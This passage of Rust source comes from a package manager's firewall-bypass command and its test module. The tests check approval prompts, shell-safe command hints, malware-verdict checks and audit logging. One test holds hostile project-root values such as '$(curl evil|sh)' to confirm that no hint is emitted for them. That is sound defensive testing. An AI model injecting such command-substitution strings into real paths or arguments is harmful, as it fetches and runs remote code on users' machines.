            LpmError::InvalidPackageName(format!(
                "`{}`: {error}",
                lpm_common::sanitize_server_text(target, 120)
            ))
        })?;
        selectors.push((target, spec.to_string()));
    }
    let selects = |rule: &FirewallBypassRule, (target, spec): &(&String, String)| {
        rule.id == **target || (scope.holds(rule) && *spec == rule.spec)
    };
    let (removed, rules_total) = security_approval::remove_firewall_bypass_rules(
        |rule| selectors.iter().any(|selector| selects(rule, selector)),
        "firewall-bypass-removed",
    )?;
    let not_found: Vec<&String> = selectors
        .iter()
        .filter(|selector| !removed.iter().any(|rule| selects(rule, selector)))
        .map(|(target, _)| *target)
        .collect();
    report_removed(&removed, &not_found, rules_total, json_output);
    Ok(())
}

fn clear(
    cwd: &Path,
    project: Option<&Path>,
    global: bool,
    json_output: bool,
) -> Result<(), LpmError> {
    let filter = match (project, global) {
        (Some(path), _) => Some(RuleScope::resolve(cwd, Some(path))?),
        (None, true) => Some(RuleScope::resolve(cwd, None)?),
        (None, false) => None,
    };
    let (removed, rules_total) = security_approval::remove_firewall_bypass_rules(
        |rule| filter.as_ref().is_none_or(|filter| filter.holds(rule)),
        "firewall-bypass-cleared",
    )?;
    report_removed(&removed, &[], rules_total, json_output);
    Ok(())
}

fn report_removed(
    removed: &[FirewallBypassRule],
    not_found: &[&String],
    rules_total: usize,
    json_output: bool,
) {
    let now = Timestamp::now();
    if json_output {
        print_json(&serde_json::json!({
            "schema_version": BYPASS_SCHEMA_VERSION,
            "success": true,
            "removed": removed.iter().map(|rule| rule_json(rule, "local", now)).collect::<Vec<_>>(),
            "not_found": not_found,
            "count": removed.len(),
            "rules_total": rules_total,
        }));
        return;
    }
    for target in not_found {
        install_ui::warn_untrusted(&format!("No LPM Firewall bypass rule matches {target}."));
    }
    if removed.is_empty() {
        if not_found.is_empty() {
            install_ui::done("No LPM Firewall bypass rules to remove.");
        }
        return;
    }
    let specs: Vec<&str> = removed.iter().map(|rule| rule.spec.as_str()).collect();
    install_ui::done_untrusted(&format!(
        "Removed LPM Firewall bypass for {}. Copies already installed stay until you reinstall.",
        specs.join(", ")
    ));
}

#[cfg(test)]
mod tests {
    use super::*;

    fn refs(specs: &[FirewallBypassSpec]) -> Vec<&FirewallBypassSpec> {
        specs.iter().collect()
    }

    fn specs(raw: &[&str]) -> Vec<FirewallBypassSpec> {
        parse_specs(
            &raw.iter()
                .map(|spec| (*spec).to_string())
                .collect::<Vec<_>>(),
        )
        .unwrap()
    }

    fn global() -> RuleScope {
        RuleScope {
            scope: FirewallBypassScope::Global,
            project_root: None,
        }
    }

    #[test]
    fn approval_prompt_names_the_version_the_scope_and_the_duration() {
        assert_eq!(
            approval_prompt(&refs(&specs(&["foldrun@32.8.2"])), &global(), None, false),
            "Allow foldrun@32.8.2 past LPM Firewall in every project"
        );
        assert_eq!(
            approval_prompt(
                &refs(&specs(&["foldrun@32.8.2"])),
                &global(),
                Some(30 * 86_400),
                true
            ),
            "Allow foldrun@32.8.2, including a malware verdict, past LPM Firewall in every project for 30d"
        );
    }

    #[test]
    fn approval_prompt_lists_every_spec_of_a_batch() {
        let prompt = approval_prompt(
            &refs(&specs(&["a@1.0.0", "b", "c@^2.0.0"])),
            &global(),
            None,
            false,
        );

        assert_eq!(
            prompt,
            "Allow 3 packages past LPM Firewall in every project: a@1.0.0, every b version, c versions matching ^2.0.0"
        );
    }

    fn project(root: &str) -> RuleScope {
        RuleScope {
            scope: FirewallBypassScope::Project,
            project_root: Some(root.into()),
        }
    }

    #[test]
    fn approval_prompt_names_the_full_project_root_for_a_project_rule() {
        assert_eq!(
            approval_prompt(
                &refs(&specs(&["foldrun"])),
                &project("/work/sil"),
                None,
                false
            ),
            "Allow every foldrun version past LPM Firewall in the project at \"/work/sil\""
        );
    }

    #[test]
    fn approval_prompt_shows_a_long_root_whole_and_its_controls_visibly() {
        let long_root = format!("/work/{}  two  spaces", "d".repeat(200));
        let prompt = approval_prompt(
            &refs(&specs(&["foldrun"])),
            &project(&long_root),
            None,
            false,
        );
        assert!(
            prompt.ends_with(&format!("in the project at \"{long_root}\"")),
            "{prompt}"
        );

        let prompt = approval_prompt(
            &refs(&specs(&["foldrun"])),
            &project("/work/a\u{1b}[2Jb"),
            None,
            false,
        );
        assert!(
            prompt.ends_with("in the project at \"/work/a\\u{1b}[2Jb\""),
            "{prompt}"
        );
    }

    #[test]
    fn add_command_hint_quotes_specs_and_names_the_duration() {
        assert_eq!(
            add_command_hint(
                &refs(&specs(&["@scope/pkg@^1.2.0", "foldrun@32.8.2"])),
                &global(),
                Some(30 * 86_400),
                false,
                None
            )
            .as_deref(),
            Some("lpm firewall bypass add --ttl 30d \"@scope/pkg@^1.2.0\" \"foldrun@32.8.2\"")
        );
    }

    #[test]
    fn add_command_hint_uses_the_resolved_project_root() {
        assert_eq!(
            add_command_hint(
                &refs(&specs(&["foldrun@32.8.2"])),
                &project("/work/my app"),
                None,
                true,
                None
            )
            .as_deref(),
            Some(
                "lpm firewall bypass add --project \"/work/my app\" --allow-malware \"foldrun@32.8.2\""
            )
        );
    }

    #[test]
    fn add_command_hint_is_left_out_for_a_project_root_a_shell_would_expand() {
        for root in [
            "/work/$(curl evil|sh)",
            "/work/$HOME",
            "/work/`id`",
            "/work/%PATH%",
            "/work/a\"b",
            "/work/a!b",
        ] {
            assert_eq!(
                add_command_hint(
                    &refs(&specs(&["foldrun@32.8.2"])),
                    &project(root),
                    None,
                    false,
                    None
                ),
                None,
                "{root}"
            );
        }
    }

    #[test]
    fn expiry_that_overflows_the_timestamp_range_is_refused() {
        let now = Timestamp::now();

        assert!(expiry_after(now, Some(1_000_000_000_000), "1000000000000").is_err());
        assert_eq!(expiry_after(now, None, "").unwrap(), None);
        assert!(expiry_after(now, Some(60), "1m").unwrap().is_some());
    }

    #[test]
    fn parse_specs_drops_duplicates_by_canonical_text() {
        assert_eq!(specs(&["react@>=18  <19", "react@>=18 <19"]).len(), 1);
    }

    fn blocked(group: &str, verdict: &str) -> Preview {
        Preview::Blocked(Box::new(
            serde_json::from_value(serde_json::json!({
                "decisionId": "d",
                "name": "foldrun",
                "version": "32.8.2",
                "action": "block",
                "verdict": verdict,
                "reason": "r",
                "matchSource": "package",
                "policyMode": "enforce",
                "policy": { "group": group }
            }))
            .unwrap(),
        ))
    }

    #[test]
    fn previews_refuse_a_malware_block_without_allow_malware() {
        let previews = HashMap::from([(
            "foldrun@32.8.2".to_string(),
            blocked("lpm_ai_confirmed_malware", "malicious"),
        )]);

        let error =
            check_previews(&refs(&specs(&["foldrun@32.8.2"])), &previews, false).unwrap_err();

        assert!(error.to_string().contains("--allow-malware"), "{error}");
        assert!(check_previews(&refs(&specs(&["foldrun@32.8.2"])), &previews, true).is_ok());
    }

    #[test]
    fn previews_refuse_allow_malware_for_a_version_not_blocked_as_malware() {
        let previews = HashMap::from([(
            "foldrun@32.8.2".to_string(),
            blocked("lpm_ai_agent_control_surface", "suspicious"),
        )]);

        assert!(check_previews(&refs(&specs(&["foldrun@32.8.2"])), &previews, true).is_err());
        assert!(check_previews(&refs(&specs(&["foldrun@32.8.2"])), &previews, false).is_ok());
    }

    #[test]
    fn previews_refuse_allow_malware_when_the_verdict_is_unavailable() {
        let previews = HashMap::from([(
            "foldrun@32.8.2".to_string(),
            Preview::Unavailable("offline".into()),
        )]);

        let error =
            check_previews(&refs(&specs(&["foldrun@32.8.2"])), &previews, true).unwrap_err();

        assert!(error.to_string().contains("couldn't check"), "{error}");
    }

    #[test]
    fn previews_refuse_a_server_review_hold() {
        let previews = HashMap::from([(
            "foldrun@32.8.2".to_string(),
            blocked("lpm_administrative_review", "clean"),
        )]);

        for allow_malware in [false, true] {
            let error =
                check_previews(&refs(&specs(&["foldrun@32.8.2"])), &previews, allow_malware)
                    .unwrap_err();
            assert!(error.to_string().contains("held for LPM review"), "{error}");
        }
    }

    #[test]
    fn approval_batches_keep_each_prompt_whole() {
        let short = specs(&[
            "a@1.0.0", "b@1.0.0", "c@1.0.0", "d@1.0.0", "e@1.0.0", "f@1.0.0",
        ]);
        let long_a = format!("{}@1.0.0", "a".repeat(200));
        let long_b = format!("{}@1.0.0", "b".repeat(200));
        let long = specs(&[&long_a, &long_b, "c@1.0.0"]);
        let prompt_for =
            |batch: &[&FirewallBypassSpec]| approval_prompt(batch, &global(), None, false);
        let sizes = |raw: &[FirewallBypassSpec]| {
            approval_batches(&refs(raw), prompt_for)
                .iter()
                .map(Vec::len)
                .collect::<Vec<_>>()
        };

        assert_eq!(sizes(&short), [5, 1]);
        assert_eq!(sizes(&long), [1, 2]);
        for batch in approval_batches(&refs(&long), prompt_for) {
            let within_budget = prompt_for(&batch).chars().count() <= MAX_APPROVAL_PROMPT_CHARS;
            assert!(within_budget || batch.len() == 1, "{batch:?}");
        }
    }

    #[test]
    fn add_command_hint_is_left_out_for_a_name_a_shell_would_expand() {
        assert_eq!(
            add_command_hint(
                &refs(&specs(&["bang!tool@1.0.0"])),
                &global(),
                None,
                false,
                None
            ),
            None
        );
    }

    #[test]
    fn the_hinted_ttl_reads_back_as_the_same_duration() {
        for secs in [90, 60, 5_400, 86_400, 2 * 86_400 + 1] {
            assert_eq!(parse_ttl(Some(&ttl_argument(secs))).unwrap(), Some(secs));
        }
    }

    #[test]
    fn a_root_ending_in_now_reads_whole_in_the_macos_reason() {
        let prompt = approval_prompt(
            &refs(&specs(&["foldrun"])),
            &project("/work/app now"),
            None,
            false,
        );

        assert!(prompt.ends_with("\"/work/app now\""), "{prompt}");
    }

    #[cfg(target_os = "macos")]
    #[test]
    fn the_macos_dialog_shows_a_root_ending_in_now_whole() {
        let prompt = approval_prompt(
            &refs(&specs(&["foldrun"])),
            &project("/work/app now."),
            None,
            false,
        );

        let reason = security_approval::macos_local_auth_reason(&prompt);

        assert!(reason.ends_with("\"/work/app now.\""), "{reason}");
    }

    #[test]
    fn approval_prompt_shows_a_quote_in_a_root_as_an_escape() {
        let prompt = approval_prompt(
            &refs(&specs(&["foldrun"])),
            &project("/work/a\" for 5 minutes"),
            None,
            false,
        );

        assert!(
            prompt.ends_with("in the project at \"/work/a\\u{22} for 5 minutes\""),
            "{prompt}"
        );
    }

    #[test]
    fn approval_prompt_shows_invisible_and_reordering_characters_in_a_root() {
        let prompt = approval_prompt(
            &refs(&specs(&["foldrun"])),
            &project("/work/a\u{200b}pp\u{202e}"),
            None,
            false,
        );

        assert!(
            prompt.ends_with("\"/work/a\\u{200b}pp\\u{202e}\""),
            "{prompt}"
        );
    }

    #[test]
    fn add_command_hint_carries_a_note_a_shell_reads_unchanged() {
        let hint = |reason| {
            add_command_hint(
                &refs(&specs(&["foldrun@32.8.2"])),
                &global(),
                None,
                false,
                Some(reason),
            )
        };

        assert_eq!(
            hint("reviewed the report, ticket SEC-12").as_deref(),
            Some(
                "lpm firewall bypass add \"--reason=reviewed the report, ticket SEC-12\" \"foldrun@32.8.2\""
            )
        );
        assert_eq!(
            hint("-reviewed").as_deref(),
            Some("lpm firewall bypass add \"--reason=-reviewed\" \"foldrun@32.8.2\"")
        );
        assert_eq!(
            hint("").as_deref(),
            Some("lpm firewall bypass add \"--reason=\" \"foldrun@32.8.2\"")
        );
        for unsafe_note in [
            "costs $5",
            "reviewed \u{201C}ticket\u{201D}",
            "low \u{201E}quote",
        ] {
            assert_eq!(
                hint(unsafe_note).as_deref(),
                Some("lpm firewall bypass add \"foldrun@32.8.2\""),
                "{unsafe_note}"
            );
        }
    }

    /// The words a POSIX shell splits `hint` into after `lpm firewall`.
    #[cfg(unix)]
    fn words_a_shell_reads(hint: &str) -> Vec<String> {
        let arguments = hint.strip_prefix("lpm firewall ").unwrap();
        let output = std::process::Command::new("/bin/sh")
            .arg("-c")
            .arg(format!("printf '%s\\0' {arguments}"))
            .output()
            .unwrap();
        assert!(output.status.success(), "{output:?}");
        String::from_utf8(output.stdout)
            .unwrap()
            .split_terminator('\0')
            .map(str::to_string)
            .collect()
    }

    /// The words of `hint` after `lpm firewall`, split as every supported
    /// shell splits a command whose quoted words hold no quote or escape.
    fn quoted_words(hint: &str) -> Vec<String> {
        let mut words = Vec::new();
        let mut word = String::new();
        let mut quoted = false;
        let mut started = false;
        for character in hint.strip_prefix("lpm firewall ").unwrap().chars() {
            match character {
                '"' => {
                    quoted = !quoted;
                    started = true;
                }
                ' ' if !quoted => {
                    if started {
                        words.push(std::mem::take(&mut word));
                        started = false;
                    }
                }
                other => {
                    word.push(other);
                    started = true;
                }
            }
        }
        if started {
            words.push(word);
        }
        words
    }

    fn parse_hinted_add(words: Vec<String>) -> (Vec<String>, Option<String>, Option<String>) {
        use clap::Parser;

        #[derive(Parser)]
        struct Cli {
            #[command(subcommand)]
            command: FirewallCmd,
        }

        let mut argv = vec!["lpm".to_string()];
        argv.extend(words);
        let cli = Cli::try_parse_from(&argv).unwrap_or_else(|error| panic!("{argv:?}: {error}"));
        let FirewallCmd::Bypass {
            action: BypassCmd::Add {
                specs, reason, ttl, ..
            },
        } = cli.command
        else {
            panic!("expected `bypass add` from {argv:?}");
        };
        (specs, reason, ttl)
    }

    const HINTED_NOTES: [&str; 5] = [
        "reviewed the report, ticket SEC-12",
        "-reviewed",
        "",
        "a; b | c & d (e) {f} <g> 'quoted' x.y",
        "na\u{ef}ve \u{fc}nicode",
    ];

    fn hint_for(specs_text: &[&str], note: &str) -> String {
        add_command_hint(
            &refs(&specs(specs_text)),
            &global(),
            Some(1_800),
            false,
            Some(note),
        )
        .unwrap()
    }

    #[test]
    fn a_hinted_command_parses_back_as_the_same_request() {
        for note in HINTED_NOTES {
            for specs_text in [
                &["foldrun@32.8.2"][..],
                &["-legacy@1.0.0", "foldrun@32.8.2"][..],
            ] {
                let hint = hint_for(specs_text, note);

                let (specs, reason, ttl) = parse_hinted_add(quoted_words(&hint));

                assert_eq!(specs, specs_text, "{hint}");
                assert_eq!(reason.as_deref(), Some(note), "{hint}");
                assert_eq!(ttl.as_deref(), Some("30m"), "{hint}");
            }
        }
    }

    #[cfg(unix)]
    #[test]
    fn a_hinted_command_reads_back_through_a_shell_as_the_same_request() {
        for note in HINTED_NOTES {
            for specs_text in [
                &["foldrun@32.8.2"][..],
                &["-legacy@1.0.0", "foldrun@32.8.2"][..],
            ] {
                let hint = hint_for(specs_text, note);

                let (specs, reason, ttl) = parse_hinted_add(words_a_shell_reads(&hint));

                assert_eq!(specs, specs_text, "{hint}");
                assert_eq!(reason.as_deref(), Some(note), "{hint}");
                assert_eq!(ttl.as_deref(), Some("30m"), "{hint}");
            }
        }
    }

    fn rule(spec: &FirewallBypassSpec, ttl_secs: Option<u64>) -> FirewallBypassRule {
        rule_covering(spec, ttl_secs, false)
    }

    fn rule_covering(
        spec: &FirewallBypassSpec,
        ttl_secs: Option<u64>,
        allow_malware: bool,
    ) -> FirewallBypassRule {
        let now = Timestamp::now();
        let mut rule =
            FirewallBypassRule::new(spec, FirewallBypassScope::Global, None, allow_malware, now);
        rule.expires_at = expiry_after(now, ttl_secs, "").unwrap();
        rule
    }

    fn save(rules: &[FirewallBypassRule]) {
        assert!(matches!(
            security_approval::commit_firewall_bypass_rules(rules, [], "").unwrap(),
            security_approval::FirewallBypassCommit::Saved(_)
        ));
    }

    fn saved_specs() -> Vec<String> {
        let mut specs: Vec<String> = security_approval::load_local_firewall_bypass_rules()
            .unwrap()
            .into_iter()
            .map(|rule| rule.spec)
            .collect();
        specs.sort();
        specs
    }

    fn spec_names(rules: &[FirewallBypassRule]) -> Vec<&str> {
        rules.iter().map(|rule| rule.spec.as_str()).collect()
    }

    fn plan<'a>(
        specs: &'a [FirewallBypassSpec],
        scope: &'a RuleScope,
        ttl_secs: Option<u64>,
        allow_malware: bool,
    ) -> PlannedAdd<'a> {
        PlannedAdd {
            specs,
            scope,
            ttl_secs,
            allow_malware,
            reason: None,
            json_output: false,
            preview: None,
        }
    }

    fn run_add(
        plan: &PlannedAdd<'_>,
        rules: Vec<FirewallBypassRule>,
        approve: impl FnMut(&security_approval::FirewallBypassApproval<'_>) -> Result<(), LpmError>,
    ) -> Result<security_approval::FirewallBypassAdded, LpmError> {
        let sorted = security_approval::sort_firewall_bypass_requests(rules).unwrap();
        tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .unwrap()
            .block_on(approve_and_save(
                &RegistryClient::new(),
                plan,
                sorted,
                approve,
            ))
    }

    #[test]
    fn add_asks_again_for_a_saved_rule_removed_while_another_was_approved() {
        let temp = tempfile::tempdir().unwrap();
        security_approval::test_support::with_test_env(temp.path(), || {
            let specs = specs(&["kept@1.0.0", "fresh@1.0.0"]);
            save(&[rule(&specs[0], None)]);
            let scope = global();
            let mut asked: Vec<Vec<String>> = Vec::new();

            let outcome = run_add(
                &plan(&specs, &scope, None, false),
                vec![rule(&specs[0], None), rule(&specs[1], None)],
                |approval| {
                    if asked.is_empty() {
                        security_approval::remove_firewall_bypass_rules(
                            |rule| rule.spec == "kept@1.0.0",
                            "firewall-bypass-removed",
                        )
                        .unwrap();
                    }
                    asked.push(
                        approval
                            .rules
                            .iter()
                            .map(|rule| rule.spec.clone())
                            .collect(),
                    );
                    Ok(())
                },
            )
            .unwrap();

            assert_eq!(asked, [vec!["fresh@1.0.0"], vec!["kept@1.0.0"]]);
            assert_eq!(spec_names(&outcome.added), ["fresh@1.0.0", "kept@1.0.0"]);
            assert!(outcome.unchanged.is_empty());
            assert_eq!(saved_specs(), ["fresh@1.0.0", "kept@1.0.0"]);
        });
    }

    #[test]
    fn add_hint_repeats_the_whole_request_when_a_later_approval_is_declined() {
        let temp = tempfile::tempdir().unwrap();
        security_approval::test_support::with_test_env(temp.path(), || {
            let specs = specs(&[
                "a@1.0.0",
                "b@1.0.0",
                "c@1.0.0",
                "d@1.0.0",
                "e@1.0.0",
                "f@1.0.0",
                "held@1.0.0",
                "same@1.0.0",
            ]);
            let requested: Vec<FirewallBypassRule> =
                specs.iter().map(|spec| rule(spec, Some(1_800))).collect();
            let unchanged = requested[7].clone();
            save(&[rule(&specs[6], None), unchanged]);
            let scope = global();
            let mut hints: Vec<Option<String>> = Vec::new();

            let error = run_add(
                &plan(&specs, &scope, Some(1_800), false),
                requested,
                |approval| {
                    hints.push(approval.command_hint.map(str::to_string));
                    if hints.len() == 1 {
                        Ok(())
                    } else {
                        Err(LpmError::SecurityApprovalStore("declined".to_string()))
                    }
                },
            )
            .unwrap_err();

            assert!(
                matches!(error, LpmError::SecurityApprovalStore(message) if message == "declined")
            );
            let whole = "lpm firewall bypass add --ttl 30m \"a@1.0.0\" \"b@1.0.0\" \"c@1.0.0\" \"d@1.0.0\" \"e@1.0.0\" \"f@1.0.0\" \"held@1.0.0\" \"same@1.0.0\"";
            assert_eq!(hints, [Some(whole.to_string()), Some(whole.to_string())]);
            assert_eq!(saved_specs(), ["held@1.0.0", "same@1.0.0"]);
            assert!(
                security_approval::load_local_firewall_bypass_rules()
                    .unwrap()
                    .iter()
                    .any(|rule| rule.spec == "held@1.0.0" && rule.expires_at.is_none())
            );
        });
    }

    #[test]
    fn add_keeps_narrowing_a_rule_that_shares_an_id_with_one_removed_during_approval() {
        let temp = tempfile::tempdir().unwrap();
        security_approval::test_support::with_test_env(temp.path(), || {
            let specs = specs(&["removed@1.0.0", "twin@1.0.0", "fresh@1.0.0"]);
            let removed = rule(&specs[0], None);
            let mut twin = rule(&specs[1], None);
            twin.id = removed.id.clone();
            let mut requested: Vec<FirewallBypassRule> =
                specs.iter().map(|spec| rule(spec, Some(1_800))).collect();
            requested[1].id = twin.id.clone();
            save(&[removed, twin]);
            let twin_expiry = requested[1].expires_at;
            let scope = global();
            let mut approvals = 0;

            let outcome = run_add(&plan(&specs, &scope, Some(1_800), false), requested, |_| {
                if approvals == 0 {
                    security_approval::remove_firewall_bypass_rules(
                        |rule| rule.spec == "removed@1.0.0",
                        "firewall-bypass-removed",
                    )
                    .unwrap();
                }
                approvals += 1;
                Ok(())
            })
            .unwrap();

            assert_eq!(approvals, 2);
            assert_eq!(spec_names(&outcome.narrowed), ["twin@1.0.0"]);
            let saved = security_approval::load_local_firewall_bypass_rules().unwrap();
            let saved_twin = saved.iter().find(|rule| rule.spec == "twin@1.0.0").unwrap();
            assert_eq!(saved_twin.expires_at, twin_expiry);
        });
    }

    #[test]
    fn add_saves_nothing_when_its_expiry_passes_during_approval() {
        let temp = tempfile::tempdir().unwrap();
        security_approval::test_support::with_test_env(temp.path(), || {
            let specs = specs(&["late@1.0.0"]);
            let mut late = rule(&specs[0], None);
            late.expires_at =
                Timestamp::now().checked_add(lpm_common::timestamp::Duration::milliseconds(500));
            let scope = global();

            let error = run_add(
                &plan(&specs, &scope, Some(1), false),
                vec![late],
                |approval| {
                    assert!(
                        !approval.rules[0].is_expired(Timestamp::now()),
                        "the rule must still be live when approval starts"
                    );
                    std::thread::sleep(std::time::Duration::from_millis(700));
                    Ok(())
                },
            )
            .unwrap_err();

            assert!(error.to_string().contains("--ttl"), "{error}");
            assert_eq!(error.error_code(), "security_approval_required");
            let LpmError::SecurityApprovalRequired(approval) = &error else {
                unreachable!("checked by the error code");
            };
            assert_eq!(
                approval.suggested_command.as_deref(),
                Some("lpm firewall bypass add --ttl 1 \"late@1.0.0\"")
            );
            assert!(
                security_approval::load_local_firewall_bypass_rules()
                    .unwrap()
                    .is_empty()
            );
            let audit = security_approval::test_support::audit_details("firewall-bypass-added");
            assert_eq!(audit.len(), 1, "{audit:?}");
            let detail = audit[0].as_deref().unwrap_or_default();
            assert!(detail.contains("--ttl"), "{detail}");
            assert!(
                detail.contains("approved: Allow late@1.0.0 past LPM Firewall in every project"),
                "{detail}"
            );
        });
    }

    fn project_rule(spec: &FirewallBypassSpec, root: &str) -> FirewallBypassRule {
        FirewallBypassRule::new(
            spec,
            FirewallBypassScope::Project,
            Some(root.to_string()),
            false,
            Timestamp::now(),
        )
    }

    #[test]
    fn add_keeps_approvals_a_later_decline_discards_on_record_with_the_project() {
        let temp = tempfile::tempdir().unwrap();
        security_approval::test_support::with_test_env(temp.path(), || {
            let specs = specs(&[
                "a@1.0.0", "b@1.0.0", "c@1.0.0", "d@1.0.0", "e@1.0.0", "f@1.0.0",
            ]);
            let scope = project("/work/app");
            let requested = specs
                .iter()
                .map(|spec| project_rule(spec, "/work/app"))
                .collect();
            let mut prompts = Vec::new();

            run_add(&plan(&specs, &scope, None, false), requested, |approval| {
                prompts.push(approval.prompt.to_string());
                if prompts.len() == 1 {
                    Ok(())
                } else {
                    Err(LpmError::SecurityApprovalStore("declined".to_string()))
                }
            })
            .unwrap_err();

            let records = security_approval::test_support::audit_records("firewall-bypass-added");
            assert_eq!(records.len(), 1, "{records:?}");
            assert!(!records[0].allowed);
            assert_eq!(records[0].project_root.as_deref(), Some("/work/app"));
            let detail = records[0].detail.as_deref().unwrap_or_default();
            assert!(
                detail.ends_with(&format!("approved: {}", prompts[0])),
                "{detail}"
            );
        });
    }

    #[test]
    fn a_declined_later_approval_leaves_one_refusal_on_record() {
        let temp = tempfile::tempdir().unwrap();
        security_approval::test_support::with_test_env(temp.path(), || {
            let specs = specs(&[
                "a@1.0.0", "b@1.0.0", "c@1.0.0", "d@1.0.0", "e@1.0.0", "f@1.0.0",
            ]);
            let scope = global();
            let requested = specs.iter().map(|spec| rule(spec, None)).collect();
            let mut approvals = 0;

            let mut prompts = Vec::new();

            let error = run_add(&plan(&specs, &scope, None, false), requested, |approval| {
                approvals += 1;
                prompts.push(approval.prompt.to_string());
                if approvals == 2 {
                    // SAFETY: the test environment holds the process-wide
                    // environment lock and restores the variable afterwards.
                    unsafe { std::env::set_var("LPM_TEST_SECURITY_AUTH_RESULT", "deny") };
                }
                security_approval::approve_firewall_bypass_rules(approval)
            })
            .unwrap_err();

            assert_eq!(approvals, 2);
            let records = security_approval::test_support::audit_records("firewall-bypass-added");
            assert_eq!(records.len(), 1, "{records:?}");
            assert!(!records[0].allowed);
            assert_eq!(
                records[0].detail,
                Some(format!("{error}; approved: {}", prompts[0]))
            );
            assert!(error.to_string().contains("not approved"), "{error}");
        });
    }

    #[test]
    fn a_removal_record_counts_its_rules_in_words() {
        let temp = tempfile::tempdir().unwrap();
        security_approval::test_support::with_test_env(temp.path(), || {
            let specs = specs(&["one@1.0.0", "two@1.0.0", "three@1.0.0"]);
            save(&[
                rule(&specs[0], None),
                rule(&specs[1], None),
                rule(&specs[2], None),
            ]);

            security_approval::remove_firewall_bypass_rules(
                |rule| rule.spec == "one@1.0.0",
                "firewall-bypass-removed",
            )
            .unwrap();
            security_approval::remove_firewall_bypass_rules(|_| true, "firewall-bypass-removed")
                .unwrap();

            assert_eq!(
                security_approval::test_support::audit_details("firewall-bypass-removed"),
                [
                    Some("removed 1 LPM Firewall bypass rule".to_string()),
                    Some("removed 2 LPM Firewall bypass rules".to_string()),
                ]
            );
        });
    }

    #[test]
    fn add_records_a_refusal_for_a_setup_error_once_its_specs_are_known() {
        let temp = tempfile::tempdir().unwrap();
        security_approval::test_support::with_test_env(temp.path(), || {
            let specs = vec!["left-pad@1.3.0".to_string()];
            let run_add_command = |ttl: Option<&str>| {
                tokio::runtime::Builder::new_current_thread()
                    .enable_all()
                    .build()
                    .unwrap()
                    .block_on(add(
                        &RegistryClient::new(),
                        temp.path(),
                        &AddRequest {
                            specs: &specs,
                            project: None,
                            ttl,
                            reason: None,
                            allow_malware: false,
                        },
                        true,
                    ))
                    .unwrap_err()
            };

            let invalid_ttl = run_add_command(Some("soon"));
            let lpm_home = temp.path().join("lpm-home");
            std::fs::create_dir_all(&lpm_home).unwrap();
            std::fs::write(
                lpm_home.join("config.toml"),
                "force-security-floor = true\n[firewall]\nmode = \"sometimes\"\n",
            )
            .unwrap();
            let invalid_mode = run_add_command(None);
            std::fs::write(
                lpm_home.join("config.toml"),
                "registry-token = \"npm_SECRETVALUE\n",
            )
            .unwrap();
            let unparsable = run_add_command(None);

            assert!(
                invalid_ttl
                    .to_string()
                    .contains("invalid `--ttl` value `soon`")
            );
            assert!(
                invalid_mode.to_string().contains("sometimes"),
                "{invalid_mode}"
            );
            assert!(
                unparsable.to_string().contains("npm_SECRETVALUE"),
                "{unparsable}"
            );
            let records = security_approval::test_support::audit_records("firewall-bypass-added");
            assert_eq!(records.len(), 3, "{records:?}");
            assert!(records.iter().all(|record| !record.allowed), "{records:?}");
            assert_eq!(records[0].detail, Some(invalid_ttl.to_string()));
            // A settings file can hold credentials, so only the kind of a
            // failure to read it is kept.
            for (record, error) in records[1..].iter().zip([&invalid_mode, &unparsable]) {
                assert_eq!(
                    record.detail.as_deref(),
                    Some(
                        format!(
                            "LPM CLI couldn't read the settings `add` checks ({})",
                            error.error_code()
                        )
                        .as_str()
                    )
                );
            }
        });
    }

    #[test]
    fn a_preview_that_cannot_read_its_settings_records_only_the_kind() {
        let temp = tempfile::tempdir().unwrap();
        security_approval::test_support::with_test_env(temp.path(), || {
            let specs = specs(&["fresh@1.0.0"]);
            let scope = global();
            let table: toml::Table = toml::from_str(
                "[firewall]\nmode = \"enforce\"\n[firewall.npm.policies]\nlpm_ai_telemetry = \"npm_SECRETVALUE\"\n",
            )
            .unwrap();
            let config = crate::commands::config::GlobalConfig::from_table(table);
            let effective = security_approval::load_effective_authorized_posture().unwrap();
            let mut planned = plan(&specs, &scope, None, false);
            planned.preview = Some((&config, &effective));

            let error = run_add(&planned, vec![rule(&specs[0], None)], |_| {
                panic!("nothing is approved without a preview")
            })
            .unwrap_err();

            assert!(error.to_string().contains("npm_SECRETVALUE"), "{error}");
            assert_eq!(
                security_approval::test_support::audit_details("firewall-bypass-added"),
                [Some(format!(
                    "LPM CLI couldn't read the settings `add` checks ({})",
                    error.error_code()
                ))]
            );
        });
    }

    #[test]
    fn an_approval_that_cannot_read_the_managed_policy_records_only_the_kind() {
        let temp = tempfile::tempdir().unwrap();
        security_approval::test_support::with_test_env(temp.path(), || {
            let specs = specs(&["fresh@1.0.0"]);
            let scope = global();
            std::fs::write(
                temp.path().join("managed-security-policy.toml"),
                "registry-token = \"npm_SECRETVALUE\n",
            )
            .unwrap();

            let error = run_add(
                &plan(&specs, &scope, None, false),
                vec![rule(&specs[0], None)],
                |_| panic!("nothing is approved when the settings can't be read"),
            )
            .unwrap_err();

            assert!(error.to_string().contains("npm_SECRETVALUE"), "{error}");
            assert_eq!(
                security_approval::test_support::audit_details("firewall-bypass-added"),
                [Some(format!(
                    "LPM CLI couldn't read the settings `add` checks ({})",
                    error.error_code()
                ))]
            );
        });
    }

    /// Runs `add` for `raw` specs, writing a managed policy that owns the
    /// firewall while the first prompt is open, and returns the error and how
    /// many prompts opened.
    fn add_while_a_managed_policy_takes_over(
        dir: &std::path::Path,
        raw: &[&str],
    ) -> (LpmError, usize) {
        let specs = specs(raw);
        let scope = global();
        let requested = specs.iter().map(|spec| rule(spec, None)).collect();
        let mut prompts = 0;
        let error = run_add(&plan(&specs, &scope, None, false), requested, |_| {
            prompts += 1;
            std::fs::write(
                dir.join("managed-security-policy.toml"),
                "[firewall]\nmode = \"enforce\"\n",
            )
            .unwrap();
            Ok(())
        })
        .unwrap_err();
        (error, prompts)
    }

    #[test]
    fn add_opens_no_further_prompt_once_a_managed_policy_turns_local_rules_off() {
        let temp = tempfile::tempdir().unwrap();
        security_approval::test_support::with_test_env(temp.path(), || {
            let (error, prompts) = add_while_a_managed_policy_takes_over(
                temp.path(),
                &[
                    "tool-a@1.0.0",
                    "tool-b@1.0.0",
                    "tool-c@1.0.0",
                    "tool-d@1.0.0",
                    "tool-e@1.0.0",
                    "tool-f@1.0.0",
                ],
            );

            assert!(
                error.to_string().contains("manages the npm firewall"),
                "{error}"
            );
            assert_eq!(prompts, 1);
            assert!(saved_specs().is_empty());
            let details = security_approval::test_support::audit_details("firewall-bypass-added");
            assert_eq!(details.len(), 1, "{details:?}");
